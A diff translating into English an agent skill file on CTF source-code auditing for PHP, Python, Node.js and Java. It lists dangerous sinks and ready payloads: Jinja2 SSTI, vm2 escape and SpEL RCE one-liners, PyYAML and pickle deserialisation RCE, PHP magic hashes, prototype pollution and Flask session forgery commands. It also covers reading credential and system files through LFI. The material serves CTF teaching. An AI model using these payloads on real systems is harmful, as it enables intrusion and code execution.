@@ -1,158 +1,160 @@
 ---
 name: ctf-source-audit
-description: "CTF 挑战中的源码审计方法。当发现 .git 目录、.bak/.zip 备份、/proc/self/environ 泄露源码时使用。与真实代码审计不同——CTF 源码中的漏洞是故意设置的，通常只有 1-2 个关键点。先找危险函数（sink），再追溯输入（source）到该函数的路径。覆盖 PHP/Python/Node.js/Java 四种语言的危险函数和漏洞模式"
+description: "Source code audit methodology for CTF challenges. Use when source code is leaked through .git directories, .bak/.zip backups, or /proc/self/environ. Unlike a real code audit — vulnerabilities in CTF source code are deliberately planted and there are usually only 1-2 key points. First find the dangerous functions (sinks), then trace the path of the input (source) to those functions. Covers dangerous functions and vulnerability patterns for PHP/Python/Node.js/Java"
+zh-signals: "CTF 挑战中的源码审计方法，从危险函数反向追溯输入路径。信号:CTF,源码审计,危险函数,代码审计,PHP"
+when-to-use: "Use when CTF source code is leaked via .git, backup files, or /proc/self/environ and you need to audit intentionally planted vulnerabilities."
 metadata:
-  tags: "ctf,source,audit,code review,源码审计,php,python,node,java,代码审计,SAST"
+  tags: "ctf,source,audit,code review,source-code-audit,php,python,node,java,code-audit,SAST"
   category: "ctf"
 ---
 
-# CTF 源码审计方法论
+# CTF Source Code Audit Methodology
 
-CTF 源码审计 ≠ 真实代码审计。区别：
-- 真实审计：几万行代码，漏洞可能在任何地方
-- CTF 审计：**几十到几百行代码，漏洞是故意设置的，通常很明显**
+CTF source code audit ≠ a real code audit. The differences:
+- A real audit: tens of thousands of lines, the vulnerability can be anywhere
+- A CTF audit: **dozens to hundreds of lines, the vulnerability is deliberately planted and usually obvious**
 
-核心策略：**找危险函数**（sink），然后追溯输入（source）到危险函数的路径。
+Core strategy: **find the dangerous functions** (sinks), then trace the path of the input (source) to those dangerous functions.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- PHP/Python/Node.js/Java 完整危险函数清单、漏洞模式 → [references/dangerous-functions.md](references/dangerous-functions.md)
+- Complete dangerous function list and vulnerability patterns for PHP/Python/Node.js/Java → [references/dangerous-functions.md](references/dangerous-functions.md)
 
-## Phase 1: 快速识别语言和框架
+## Phase 1: Quickly Identify the Language and Framework
 
-| 特征 | 语言/框架 |
+| Indicator | Language/Framework |
 |------|-----------|
-| `.php` 文件、`<?php` | PHP |
-| `app.py`、`from flask`、`import django` | Python (Flask/Django) |
-| `package.json`、`require()`、`app.js` | Node.js (Express) |
-| `pom.xml`、`.java`、`@Controller` | Java (Spring) |
-| `go.mod`、`func main()` | Go |
+| `.php` files, `<?php` | PHP |
+| `app.py`, `from flask`, `import django` | Python (Flask/Django) |
+| `package.json`, `require()`, `app.js` | Node.js (Express) |
+| `pom.xml`, `.java`, `@Controller` | Java (Spring) |
+| `go.mod`, `func main()` | Go |
 
-## Phase 2: 审计流程
+## Phase 2: Audit Workflow
 
-### 2.1 快速定位危险函数
+### 2.1 Quickly Locate Dangerous Functions
 
-| 语言 | 命令执行 | 反序列化 | 模板注入 | 文件操作 |
+| Language | Command Execution | Deserialization | Template Injection | File Operations |
 |------|----------|----------|----------|----------|
 | PHP | `system()` `eval()` `exec()` `passthru()` | `unserialize()` | N/A | `include()` `file_get_contents()` |
 | Python | `os.system()` `eval()` `exec()` `subprocess` | `pickle.loads()` `yaml.load()` | `render_template_string()` | `open()` |
 | Node.js | `child_process.exec()` `eval()` | N/A | EJS/Pug inject | `fs.readFile()` |
 | Java | `Runtime.exec()` `ProcessBuilder` | `ObjectInputStream` | SpEL/FreeMarker | `FileInputStream` |
 
-→ 完整危险函数清单 → [references/dangerous-functions.md](references/dangerous-functions.md)
+→ Complete dangerous function list → [references/dangerous-functions.md](references/dangerous-functions.md)
 
-### 2.2 追踪数据流（sink → source）
+### 2.2 Trace the Data Flow (sink → source)
 
-1. **参数从哪来？** — `$_GET`, `request.args`, `req.body`, `@RequestParam`
-2. **有没有过滤？** — 搜 `filter`, `sanitize`, `escape`, `replace`, `blacklist`
-3. **过滤能绕过吗？** — CTF 中通常有绕过（黑名单遗漏、双重编码、大小写、数组绕过）
+1. **Where does the parameter come from?** — `$_GET`, `request.args`, `req.body`, `@RequestParam`
+2. **Is there any filtering?** — search for `filter`, `sanitize`, `escape`, `replace`, `blacklist`
+3. **Can the filtering be bypassed?** — CTF challenges usually have a bypass (blacklist omission, double encoding, case sensitivity, array bypass)
 
-### 2.3 审计产出
-1. 漏洞类型和位置（文件名+行号）
-2. 利用方法（构造什么请求触发）
-3. Flag 获取路径
+### 2.3 Audit Deliverables
+1. Vulnerability type and location (file name + line number)
+2. Exploitation method (what request to construct to trigger it)
+3. Path to obtain the flag
 
-## Phase 3: PHP 常见漏洞模式
+## Phase 3: Common PHP Vulnerability Patterns
 
-### 弱比较 (`==` vs `===`)
+### Weak Comparison (`==` vs `===`)
 
 ```php
-// 0e 开头的字符串在 == 比较时被当作科学计数法，等于 0
-if ($_GET['password'] == '0e123456') { ... }  // 输入 "0" → true
-if (md5($a) == md5($b)) { ... }  // 找两个 md5 以 0e 开头的值
+// Strings starting with 0e are treated as scientific notation in == comparisons and equal 0
+if ($_GET['password'] == '0e123456') { ... }  // input "0" → true
+if (md5($a) == md5($b)) { ... }  // find two md5 values starting with 0e
 
-// 0e MD5 碰撞值：
+// 0e MD5 collision values:
 // md5("240610708")  = 0e462097431906509019562988736854
 // md5("QNKCDZO")    = 0e830400451993494058024219903391
 // md5("s878926199a") = 0e545993274517709034328855841020
 
-// 数组绕过 ===
+// Array bypass of ===
 if ($a != $b && md5($a) === md5($b)) { ... }
-// md5(array) 返回 NULL → a[]=1&b[]=2
+// md5(array) returns NULL → a[]=1&b[]=2
 ```
 
-### 变量覆盖
+### Variable Overwrite
 
 ```php
-extract($_GET);  // GET 参数覆盖任意变量
-parse_str($str); // 解析字符串为变量（无第二个参数时）
-$$key = $value;  // 可变变量
+extract($_GET);  // GET parameters overwrite arbitrary variables
+parse_str($str); // parses a string into variables (when no second argument is given)
+$$key = $value;  // variable variables
 
-// 利用：?admin=1 覆盖 $admin 变量
+// Exploitation: ?admin=1 overwrites the $admin variable
 ```
 
-### PHP 类型戏法
+### PHP Type Juggling
 
 ```php
-// intval() 截断
-intval("123abc") === 123  // 非数字部分被忽略
-intval("0x1A") === 0      // PHP 7 不解析 hex（PHP 5 可以）
+// intval() truncation
+intval("123abc") === 123  // the non-numeric part is ignored
+intval("0x1A") === 0      // PHP 7 does not parse hex (PHP 5 does)
 
-// is_numeric() 绕过
+// is_numeric() bypass
 is_numeric("0x539") → true (PHP 5)
-is_numeric("1e5") → true   // 科学计数法
+is_numeric("1e5") → true   // scientific notation
 
-// in_array() 松散比较
-in_array(0, ['a','b','c']) → true  // 0 == 'a' 在松散比较中为 true（PHP 7 以下）
-// 修复：in_array(0, ['a','b','c'], true) 第三个参数=strict
+// in_array() loose comparison
+in_array(0, ['a','b','c']) → true  // 0 == 'a' is true in a loose comparison (PHP < 7)
+// Fix: in_array(0, ['a','b','c'], true) third parameter = strict
 ```
 
 ### preg_replace /e (PHP < 7.0)
 
 ```php
-preg_replace('/.*/e', 'system("id")', '');  // /e 修饰符执行替换结果
+preg_replace('/.*/e', 'system("id")', '');  // the /e modifier executes the replacement result
 ```
 
-### 反序列化 POP 链
+### Deserialization POP Chain
 
-搜索 `__wakeup()`, `__destruct()`, `__toString()` 魔术方法，构造链式调用。
+Search for the `__wakeup()`, `__destruct()`, `__toString()` magic methods and construct a chained call.
 
 ```php
-// __wakeup 绕过：序列化字符串中属性个数大于实际值
-O:4:"User":3:{...}  // 实际只有 2 个属性，写 3 → 跳过 __wakeup
-// 适用 PHP 5.x - 7.0.10
+// __wakeup bypass: the serialized string claims more properties than actually exist
+O:4:"User":3:{...}  // only 2 properties exist but 3 are written → skips __wakeup
+// Applies to PHP 5.x - 7.0.10
 ```
 
-## Phase 4: Python 常见漏洞模式
+## Phase 4: Common Python Vulnerability Patterns
 
-### Flask Session 伪造
+### Flask Session Forgery
 
 ```python
-# 如果知道 SECRET_KEY，可以伪造 Flask session
-# 工具：flask-unsign
+# If you know the SECRET_KEY, you can forge a Flask session
+# Tool: flask-unsign
 flask-unsign --decode --cookie 'SESSION_COOKIE'
 flask-unsign --sign --cookie "{'user':'admin'}" --secret 'SECRET_KEY'
 
-# SECRET_KEY 泄露路径：
-# - 源码中硬编码
-# - /proc/self/environ 中的环境变量
-# - config.py / .env 文件
+# SECRET_KEY leak paths:
+# - hardcoded in the source code
+# - environment variable in /proc/self/environ
+# - config.py / .env file
 ```
 
-### Werkzeug Debug PIN 计算
+### Werkzeug Debug PIN Calculation
 
 ```python
-# 当 Flask DEBUG=True 时，/console 需要 PIN
-# PIN 计算因素（全部可通过 LFI 获取）：
-# 1. username: /etc/passwd 中运行 Flask 的用户
-# 2. modname: 通常是 "flask.app"
-# 3. appname: 通常是 "Flask"
-# 4. modpath: flask/app.py 的路径 → /proc/self/cmdline + find
-# 5. MAC 地址: /sys/class/net/eth0/address → 转十进制
+# When Flask DEBUG=True, /console requires a PIN
+# PIN calculation factors (all obtainable via LFI):
+# 1. username: the user running Flask in /etc/passwd
+# 2. modname: usually "flask.app"
+# 3. appname: usually "Flask"
+# 4. modpath: the path of flask/app.py → /proc/self/cmdline + find
+# 5. MAC address: /sys/class/net/eth0/address → convert to decimal
 # 6. machine-id: /etc/machine-id + /proc/self/cgroup (Docker)
 
-# 计算脚本见 ctf-web-methodology 的 server-side-advanced.md
+# See server-side-advanced.md in ctf-web-methodology for the calculation script
 ```
 
 ### SSTI (Jinja2)
 
 ```python
-render_template_string(user_input)  # 危险！
-# 检测：{{7*7}} → 49
-# RCE：{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}
+render_template_string(user_input)  # dangerous!
+# Detection: {{7*7}} → 49
+# RCE: {{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 
-### Pickle 反序列化 RCE
+### Pickle Deserialization RCE
 
 ```python
 import pickle, base64, os
@@ -164,67 +166,67 @@ class Exploit:
 payload = base64.b64encode(pickle.dumps(Exploit())).decode()
 ```
 
-### PyYAML 不安全加载
+### Unsafe PyYAML Loading
 
 ```python
-yaml.load(data)  # 不安全！需要 yaml.safe_load()
+yaml.load(data)  # unsafe! yaml.safe_load() is required
 # payload: !!python/object/apply:os.system ['cat /flag.txt']
 ```
 
-## Phase 5: Node.js 常见漏洞模式
+## Phase 5: Common Node.js Vulnerability Patterns
 
-### 原型链污染
+### Prototype Pollution
 
 ```javascript
-// 危险函数：Object.assign(), _.merge(), _.set(), 递归合并
+// Dangerous functions: Object.assign(), _.merge(), _.set(), recursive merge
 // payload: {"__proto__":{"isAdmin":true}}
-// 或: {"constructor":{"prototype":{"isAdmin":true}}}
+// Or: {"constructor":{"prototype":{"isAdmin":true}}}
 
-// 利用场景：
-// 1. 修改 Object.prototype 影响全局
-// 2. 覆盖已有属性（role: admin）
-// 3. RCE：污染 child_process 的 env/shell
+// Exploitation scenarios:
+// 1. Modifying Object.prototype affects everything globally
+// 2. Overwriting existing properties (role: admin)
+// 3. RCE: polluting the env/shell of child_process
 ```
 
-### require() 路径穿越
+### require() Path Traversal
 
 ```javascript
-// 如果用户控制 require() 参数
-require('../../../etc/passwd');  // 虽然不执行但可泄露错误信息
+// If the user controls the require() argument
+require('../../../etc/passwd');  // does not execute but can leak error messages
 require('/proc/self/environ');
 ```
 
-### eval() / vm 逃逸
+### eval() / vm Escape
 
 ```javascript
-// vm2 沙箱逃逸（多个 CVE）
+// vm2 sandbox escape (multiple CVEs)
 const {VM} = require("vm2");
 const vm = new VM();
 vm.run('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()');
 ```
 
-## Phase 6: Java 常见漏洞模式
+## Phase 6: Common Java Vulnerability Patterns
 
-### SpEL 注入 (Spring)
+### SpEL Injection (Spring)
 
 ```java
-// 如果用户输入被嵌入 SpEL 表达式
-// 检测：${7*7} → 49 或 #{7*7} → 49
-// RCE：
+// If user input is embedded into a SpEL expression
+// Detection: ${7*7} → 49 or #{7*7} → 49
+// RCE:
 #{T(java.lang.Runtime).getRuntime().exec("id")}
 ```
 
-### XXE (Java XML 解析)
+### XXE (Java XML Parsing)
 
-Java 的 XML 解析器默认不禁用外部实体（需要手动设置），是 XXE 高发区。
+Java XML parsers do not disable external entities by default (it must be set manually), making them a common XXE ground.
 
-### 反序列化（ObjectInputStream）
+### Deserialization (ObjectInputStream)
 
-搜索 `ObjectInputStream.readObject()` → 配合 ysoserial 生成 payload。
+Search for `ObjectInputStream.readObject()` → use ysoserial to generate the payload.
 
-## 注意事项
+## Notes
 
-- CTF 源码通常很短（<200行），不要用复杂工具，手动审计即可
-- 优先搜索 `flag`、`secret`、`admin` 关键字
-- 注意注释中的提示（CTF 出题者有时会留线索）
-- 多文件项目：先看路由（`app.py` / `index.php` / `app.js`），再看控制器逻辑
+- CTF source is usually short (<200 lines), do not use complex tools, manual auditing is enough
+- Prioritize searching for the `flag`, `secret`, `admin` keywords
+- Watch for hints in comments (CTF authors sometimes leave clues)
+- Multi-file projects: look at the routes first (`app.py` / `index.php` / `app.js`), then the controller logic
